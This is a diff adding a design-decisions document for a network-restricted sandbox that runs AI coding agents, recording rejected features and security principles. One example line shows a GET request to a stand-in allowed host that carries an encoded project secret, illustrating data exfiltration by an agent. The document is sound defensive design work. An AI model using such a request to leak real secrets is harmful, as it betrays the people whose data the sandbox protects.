@@ -1,0 +1,232 @@
+# Design decisions
+
+What was decided and must not silently drift: rejected ideas (Non-TODOs), recorded so they stop
+resurfacing; the prior art they were reviewed against; and the principles to preserve. The work
+that remains is TODO.md; the security model is SECURITY.md.
+
+## Non-TODOs / deliberate design choices
+
+These ideas were reviewed against broader prior art and relevant issue histories. Do not implement
+them without a new requirement.
+
+### No general capability broker
+
+The current architecture deliberately avoids most cases in which a broker is useful by keeping
+valuable credentials outside the sandbox.
+
+A capability layer would create a second security-policy language and another enforcement surface
+while providing little reduction in authority under the current operating model. Prior art proposing
+exactly this shape — a host-side MCP auth broker/gateway holding credentials the agent container
+never sees — solves a real problem for workflows that need credentialed MCP servers, a requirement
+this project's operating model deliberately avoids:
+
+- https://github.com/mattolson/agent-sandbox/issues/122
+
+### No per-repository `GitRead(repository)` policy
+
+Public repository discovery/read access is useful. There is no private forge credential in the
+sandbox whose authority needs to be attenuated, and forge writes are already blocked at the protocol
+boundary.
+
+### No Git/SSH/cloud credential injection into the proxy
+
+Private/privileged operations happen on the host. Credential injection becomes worth considering
+only if that operating model changes.
+
+### No generic "GET is safe, POST is dangerous" rule
+
+A URL is outbound information. For example:
+
+```text
+GET https://allowed.example/<encoded-project-secret>
+```
+
+is a write from an information-flow perspective. The read-only tier does not breach this: it
+uses GET/HEAD-only to remove a host's *write API* (SECURITY.md, "Reading without being able to
+write"), never to declare a GET safe — the design principle below ("HTTP \"read\" semantics do
+not make the request an information-flow read") is unchanged by it.
+
+### No general HTTP method/path policy language
+
+Keep protocol-specific inspection only where it buys a concrete property, as it does for git
+reads versus writes. The read-only tier is the one bounded exception taken: one rule, plus a
+closed set of tags (`=git-fetch`, `=npm-audit`) each naming a fixed extra allowance — not a per-host
+language: a tag names a rule-set the proxy defines, it never describes one. Its concrete property
+is refusing every allowed host's write surface outside the agent endpoints, the one
+unauthenticated one included (storage.googleapis.com). Do not go further: no per-host rules, no
+path patterns beyond git's, no open tag set, no general-purpose policy engine without concrete
+use cases that outgrow this.
+
+### No command-name safe lists
+
+`git`, `npm`, `python`, build tools, MCP servers, and other "normal" programs can execute
+repository-controlled behavior. The outer container/network boundary should contain them all instead
+of trying to classify command names as safe.
+
+### No per-project agent-instruction override in `.ko-agent-sandbox`
+
+Style and workflow instructions already have a native per-project channel every agent reads with no
+launcher help: the project's own CLAUDE.md / AGENTS.md / GEMINI.md in the workspace, committed and
+reviewed like any other file. `.ko-agent-sandbox` is mounted read-only because its content governs
+the boundary — a session must not write the egress policy governing the next one — and prose
+instructions govern nothing enforceable, so the ceremony would protect nothing a hostile repo cannot
+already do through any file in the checkout. The image-side AGENTS.md admits only what a project
+cannot know about itself (the environment, SANDBOX.md) or must not be trusted to declare (the
+policy in force, appended at launch); the operator changes its defaults by editing SANDBOX.md or
+STYLE.md and rebuilding.
+
+### No richer egress-policy format
+
+The policy stays the three fixed lists — a `+host` / `-host` / `-**.domain` delta per tier,
+read-only additions tagged from a closed set (`=git-fetch`, `=npm-audit`), and `blocked` (hosts,
+`**.domain`, `.defaults`) applied last — no fields, no globs beyond the taking-away subtree, no
+ranked rules, no open tag vocabulary. SECURITY.md ("Adding hosts, not patterns") carries the
+reasoning; `resolveTiers` enforces it, tested rule by rule. The failure classes kept out — a
+validator and a runtime reading one configuration differently (one resolver, in the proxy, which
+the launcher's dry run executes), and an allow silently overriding a deny (one fixed order,
+`blocked` last, every contradiction a refusal) — are well attested:
+
+- https://github.com/docker/sbx-releases/issues/410
+- https://github.com/anthropic-experimental/sandbox-runtime/issues/434
+- https://github.com/anthropic-experimental/sandbox-runtime/issues/122
+- https://github.com/anthropic-experimental/sandbox-runtime/issues/154
+- https://github.com/anthropic-experimental/sandbox-runtime/issues/432
+- https://github.com/stripe/smokescreen/issues/236
+
+Do not add wildcard additions, ranked rules, a richer removal-pattern language, or a tag outside
+the closed set without a concrete need that outweighs that surface.
+
+### No HTTP query surface on the proxy
+
+Considered: the RFC 9110 shape `OPTIONS * HTTP/1.1` with `Max-Forwards: 0` and a custom query
+header, answering the effective policy from the live proxy. Rejected, because every consumer
+already gets that answer from the proxy's own `--print-policy` dry run — `--proxy-effective`, the
+launch banner, `KO_AGENT_SANDBOX_EGRESS_POLICY`, and the appended agent instructions — and the
+launcher cannot use a live query anyway: the policy must be validated and the leaf minted before
+the proxy container exists, since the leaf is a mount fixed at `podman create`. What the endpoint
+would add is a second parsed request shape at the enforcement point, against its
+CONNECT-only-one-request stance, for information already delivered. `Max-Forwards` itself creates
+no obligation here: it binds a proxy that *forwards* OPTIONS/TRACE, and this one never does —
+non-CONNECT is refused at the proxy layer, both methods are refused inside inspected tunnels, and
+a read-write tunnel is not an HTTP hop at all.
+
+### No Via header
+
+RFC 9110 §7.6.3 makes Via a MUST for an intermediary, and this proxy knowingly does not send it:
+Via exists for loop detection and protocol-capability discovery across proxy chains, and this hop
+is a single, terminal one — a loop through it cannot form. What Via would actually do here is
+stamp the proxy's presence and software onto every inspected request for every origin to read,
+metadata this design sends nowhere, and some origins vary caching behavior on it. The client side
+is not deceived: it addressed the proxy by CONNECT.
+
+### No PATH-resolved host executables
+
+Resolved, not pending: the launcher resolves `podman` (and `selinuxenabled`) to an absolute path
+through absolute `PATH` entries only — `HostCommands.findOnPath` — and the reaper receives
+that path as an argument, so no host-side invocation consults `PATH` or, on Windows, CreateProcess's
+implicit current-directory search. The launcher is started inside the repository being sandboxed, so
+its working directory is untrusted by definition; a `podman.exe` shipped in a checkout must never be
+what executes on the host. Prior art:
+
+- https://github.com/docker/sbx-releases/issues/392
+
+### No following symlinks at sandbox setup
+
+A symlinked `.git`, `.git/config`, `.git/hooks`, `.ko-agent-sandbox`, `egress-hosts` or a tier
+file inside it refuses the launch (`gitGuardVolumes`, `policyGuardVolume`, `readPolicyFiles`,
+tested). Podman resolves mount sources on the host,
+so mounting through a repository-controlled link would expose its target into the sandbox, and
+following the link to pin its resolved target would make the pinned surface depend on where the link
+points at launch time. The refusal is loud, names the path, and comes before the launcher creates
+anything, so setup writes nothing through a pre-seeded link (tested: "a refused symlink shape leaves
+no artifact through the link"); the project directory itself is `toRealPath()`-canonical before any
+of this. Prior art for both failure shapes — a sandbox that crashed mid-setup on a symlink, and
+setup code whose mount-target creation wrote through one to paths outside its root:
+
+- https://github.com/anthropic-experimental/sandbox-runtime/issues/221
+- https://github.com/bazelbuild/bazel/issues/28515
+
+The cost is that a repository sharing hooks through a symlinked `.git/hooks` cannot be sandboxed
+as-is; its user replaces the link with a real directory first. Accept that cost rather than
+following links.
+
+### No DLP/entropy/LLM firewall
+
+It would be incomplete against encoding, timing, allowed-host selection, and protocol-specific
+channels while adding false positives and another complex policy engine. Destination restriction
+remains the primary exfiltration control.
+
+### No gVisor/microVM migration yet
+
+Rootless Podman is the chosen portability/security trade-off. Revisit only if
+host-kernel/container-runtime exploitation enters the threat model.
+
+The gVisor issue history also shows that stronger runtime isolation brings additional
+rootless/nesting/mount compatibility complexity — e.g. rootless uid mapping breaking same-uid host
+file access, the problem this launcher's `--userns=keep-id` solves. That does not make gVisor a bad
+design; it means the additional boundary should be purchased only when the threat model requires it.
+
+- https://gvisor.dev/
+- https://github.com/google/gvisor/issues/9918
+
+## Prior-art references worth retaining
+
+Comparison points for future decisions, not dependencies. The specific issues that shaped a decision
+are linked inline where that decision is recorded; these are the broader sources.
+
+- Docker AI sandboxes — microVM isolation, direct-vs-clone workspace models:
+  https://docs.docker.com/ai/sandboxes/ https://docs.docker.com/ai/sandboxes/security/isolation/
+- Anthropic Claude Code — composed filesystem/network confinement, and its settings/credential
+  model: https://www.anthropic.com/engineering/claude-code-sandboxing
+  https://docs.anthropic.com/en/docs/claude-code/settings
+- Stripe Smokescreen — mature egress-proxy prior art; the two ACL-bypass advisories are permanent
+  regression inputs (TODO.md, "Host/authority regression corpus"):
+  https://github.com/stripe/smokescreen
+  https://github.com/stripe/smokescreen/security/advisories/GHSA-qwrf-gfpj-qvj6
+  https://github.com/stripe/smokescreen/security/advisories/GHSA-gcj7-j438-hjj2
+- Bazel sandboxing/hermeticity — minimizing ambient inputs/outputs, testing effective boundaries:
+  https://bazel.build/versions/9.1.0/docs/sandboxing
+- Agent sandbox/proxy comparisons, including credential brokering:
+  https://github.com/mattolson/agent-sandbox https://github.com/89luca89/clampdown
+
+## Design principles to preserve
+
+These are short enough to keep near the implementation as comments.
+
+```text
+Anything requiring valuable credentials happens outside the sandbox,
+unless the agent fundamentally cannot function without those credentials.
+```
+
+```text
+Repository-controlled execution stays inside the outer sandbox.
+Do not create a host-side execution path merely to make an agent workflow easier.
+```
+
+```text
+The writable workspace is untrusted output.
+Protect implicit host execution paths, but keep ordinary project files writable
+because editing them is the purpose of the sandbox.
+```
+
+```text
+An allowed host is a possible recipient of sandbox data.
+HTTP "read" semantics do not make the request an information-flow read.
+```
+
+```text
+Prefer a small, observable boundary over a richer policy language.
+Add policy machinery only when it removes authority the sandbox would otherwise
+have to possess.
+```
+
+```text
+Do not trade security for performance. A slow boundary is still a boundary;
+one loosened for speed is not.
+```
+
+```text
+Security configuration must fail closed.
+Unknown, malformed, or ambiguously interpreted policy must not silently weaken the
+effective boundary.
+```
